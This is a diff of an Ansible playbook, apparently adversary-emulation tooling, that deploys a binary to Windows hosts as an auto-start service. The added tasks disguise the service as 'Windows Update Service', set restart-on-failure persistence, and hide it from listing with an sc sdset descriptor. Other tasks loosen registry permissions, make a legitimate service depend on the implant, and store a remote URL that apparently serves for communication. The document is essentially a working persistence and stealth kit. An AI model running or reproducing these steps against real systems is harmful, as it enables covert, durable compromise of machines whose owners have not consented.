@@ -3,18 +3,25 @@
   hosts: all
   tasks:
 
-    # Copy the respective file from the Ansible controller to the target machine
     - name: "Copy file from Ansible controller to Windows host"
       win_copy:
         src: "{{ binary_location }}"
         dest: "{{ path_to_download }}"
-
-    # Create the service
+      tags:
+        - copy_file
+   
     - name: "Create the service using cmd"
       win_command:
-        cmd: sc create "{{ service_name }}" binPath= "{{ path_to_download }}"\\"{{ binary_name }}" start= auto
-    
-    # Create 2 registry key parameters
+        cmd: sc create "{{ service_name }}" binPath= "{{ path_to_download }}"\\"{{ service_name }}.exe" start= auto DisplayName= "Windows Update Service"
+      tags:
+        - create_service
+
+    - name: "Add persisstence using service failover"
+      win_command:
+        cmd: sc failure {{ service_name }} reset= 0 actions= restart/5000
+      tags:
+        - add_persistence
+
     - name: "Add registry parameters"
       win_regedit:
         path: "{{ reg_key_param }}{{ service_name }}"
@@ -25,21 +32,30 @@
       loop:
         - { name: "RemoteUrl", value: "/{{ group_names[0] }}{{ hostvars[inventory_hostname].file_to_download }}" }
         - { name: "LocalDir", value: "{{ path_for_comm }}" }
+      tags:
+        - reg_params
 
-    # Change permissions on registry
     - name: "Change permissions on registry"
       win_shell: |
         cmd /c "echo {{ reg_key_param }}\\{{ service_name}} [19] > C:\Windows\Temp\set_perm.regini"
         cmd /c "regini C:\Windows\Temp\set_perm.regini"
         cmd /c "del C:\Windows\Temp\set_perm.regini"
+      tags:
+        - reg_perms
 
-    # Change dependency of legitimate service
     - name: "Change dependency of legitimate service"
       win_shell: |
         cmd /c "sc config {{ service_for_injection }} depend= {{ service_name }}"
+      tags:
+        - add_depend
 
-    # Start the service
+    - name: "Hide a serivice"
+      win_shell:  
+        cmd /c sc sdset "{{ service_name }}" "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
+
     - name: "Start the service"
       win_service:
         name: "{{ service_name }}"
         state: started
+      tags:
+        - start_svc
